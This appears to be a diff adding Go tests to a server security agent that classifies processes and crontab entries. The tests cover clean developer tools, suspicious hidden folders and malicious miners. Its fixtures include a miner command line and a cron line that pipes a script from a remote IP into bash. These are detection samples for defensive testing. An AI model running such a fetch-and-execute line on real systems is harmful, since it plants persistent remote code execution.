@@ -7,6 +7,7 @@ import (
 	"path/filepath"
 	"strings"
 	"testing"
+	"time"
 
 	"github.com/xmarthost/xmartguard/agent/internal/settings"
 	"github.com/xmarthost/xmartguard/agent/internal/store"
@@ -143,5 +144,108 @@ func TestCronDisableAndEnable(t *testing.T) {
 	}
 	if fi, _ := os.Stat(file); fi.Mode().Perm() != 0o600 {
 		t.Fatal("mode changed")
+	}
+}
+
+// Node.js apps run by PM2 from nvm (a hidden folder) and other developer
+// tools are normal; hidden or temporary folders elsewhere are suspicious,
+// miners and reverse shells malicious.
+func TestAssessLevels(t *testing.T) {
+	home := "/home/vibe"
+	cases := []struct {
+		p    ProcInfo
+		want Level
+	}{
+		{ProcInfo{Exe: home + "/.nvm/versions/node/v20.11.0/bin/node", Cmdline: "PM2 v5.3.1: God Daemon (/home/vibe/.pm2)"}, Clean},
+		{ProcInfo{Exe: home + "/.nvm/versions/node/v20.11.0/bin/node", Cmdline: "node /home/vibe/app/server.js"}, Clean},
+		{ProcInfo{Exe: home + "/.nvm/versions/node/v20.10.0/bin/node (deleted)", Cmdline: "next-server (v14.2.3)"}, Clean},
+		{ProcInfo{Exe: home + "/.bun/bin/bun", Cmdline: "bun run start"}, Clean},
+		{ProcInfo{Exe: home + "/.cache/puppeteer/chrome/linux-126/chrome-linux64/chrome", Cmdline: "chrome --headless"}, Clean},
+		{ProcInfo{Exe: home + "/public_html/node_modules/@esbuild/linux-x64/bin/esbuild", Cmdline: "esbuild --service"}, Clean},
+		{ProcInfo{Exe: home + "/.config/.x/kworker", Cmdline: "kworker"}, Suspicious},
+		{ProcInfo{Exe: "/tmp/.ICE/sd", Cmdline: "sd"}, Suspicious},
+		{ProcInfo{Exe: home + "/.nvm/versions/node/v20/bin/node", Cmdline: "node x.js -o stratum+tcp://pool.example:3333"}, Malicious},
+	}
+	for _, c := range cases {
+		if _, got := Assess(c.p, home); got != c.want {
+			t.Errorf("%s | %s: got %d, want %d", c.p.Exe, c.p.Cmdline, got, c.want)
+		}
+	}
+}
+
+// Only malicious processes die at once; suspicious ones only after keeping a
+// CPU core busy for a long time, never for a short spike.
+func TestShouldKill(t *testing.T) {
+	for _, c := range []struct {
+		level        Level
+		age          time.Duration
+		life, recent float64
+		want         bool
+	}{
+		{Malicious, time.Second, 0, 0, true},
+		{Suspicious, 2 * time.Hour, 0.95, 0.98, true},
+		{Suspicious, 10 * time.Minute, 1, 1, false},   // young: a build or a start-up
+		{Suspicious, 5 * time.Hour, 0.9, 0.1, false},  // quiet now
+		{Suspicious, 5 * time.Hour, 0.05, 0.9, false}, // a short spike of an idle process
+		{Suspicious, 5 * time.Hour, 0.6, 0.7, true},
+		{Clean, 5 * time.Hour, 1, 1, false},
+	} {
+		if got := ShouldKill(c.level, c.age, c.life, c.recent); got != c.want {
+			t.Errorf("%+v: got %v", c, got)
+		}
+	}
+}
+
+func TestParseStat(t *testing.T) {
+	stat := "4242 (node server.js) S 1 4242 4242 0 -1 4194560 12 0 0 0 1500 250 0 0 20 0 11 0 987654 1234 56 18446744073709551615"
+	start, cpu := parseStat(stat)
+	if start != 987654 || cpu != 1750 {
+		t.Fatalf("start %d cpu %d", start, cpu)
+	}
+}
+
+// PM2 at boot from nvm is normal: not flagged. A hidden folder elsewhere is
+// reported but not switched off; lines an older version switched off are
+// switched back on, real malware stays off.
+func TestCronDevToolsAndRestore(t *testing.T) {
+	for _, l := range []string{
+		"@reboot /home/vibe/.nvm/versions/node/v20.11.0/bin/pm2 resurrect",
+		"@reboot cd /home/vibe/app && /home/vibe/.nvm/versions/node/v20.11.0/bin/node server.js > /dev/null 2>&1",
+		"*/5 * * * * /home/vibe/.bun/bin/bun /home/vibe/app/job.ts > /dev/null 2>&1",
+	} {
+		if r, lv := AssessCron(l); lv != Clean {
+			t.Errorf("flagged (%s): %s", r, l)
+		}
+	}
+	if _, lv := AssessCron("@reboot /home/u/.config/.x/run"); lv != Suspicious {
+		t.Errorf("hidden program: %d", lv)
+	}
+	dir := t.TempDir()
+	t.Setenv("XG_STATE_DIR", filepath.Join(dir, "state"))
+	t.Setenv("XG_CONFIG_DIR", filepath.Join(dir, "conf"))
+	Crontab = ""
+	db, _ := store.Open()
+	defer db.Close()
+	st, _ := settings.Load()
+	cron := filepath.Join(dir, "cron")
+	os.MkdirAll(cron, 0o755)
+	pm2 := "@reboot /home/vibe/.nvm/versions/node/v20.11.0/bin/pm2 resurrect"
+	hidden := "@reboot /home/vibe/.config/.x/run"
+	bad := "*/5 * * * * curl -s http://198.51.100.9/a | bash"
+	file := filepath.Join(cron, "vibe")
+	os.WriteFile(file, []byte(DisabledPrefix+pm2+"\n"+hidden+"\n"+DisabledPrefix+bad+"\n"), 0o600)
+	var got []Event
+	m := &Monitor{DB: db, Settings: st, Log: slog.New(slog.NewTextHandler(io.Discard, nil)), CronDirs: []string{cron}, OnEvent: func(e Event) { got = append(got, e) }}
+	m.CheckCron()
+	b, _ := os.ReadFile(file)
+	if string(b) != pm2+"\n"+hidden+"\n"+DisabledPrefix+bad+"\n" {
+		t.Fatalf("crontab:\n%s", b)
+	}
+	actions := map[string]string{}
+	for _, e := range got {
+		actions[e.Subject] = e.Action
+	}
+	if actions[pm2] != "restored" || actions[hidden] != "alerted" || len(got) != 2 {
+		t.Fatalf("events %+v", got)
 	}
 }
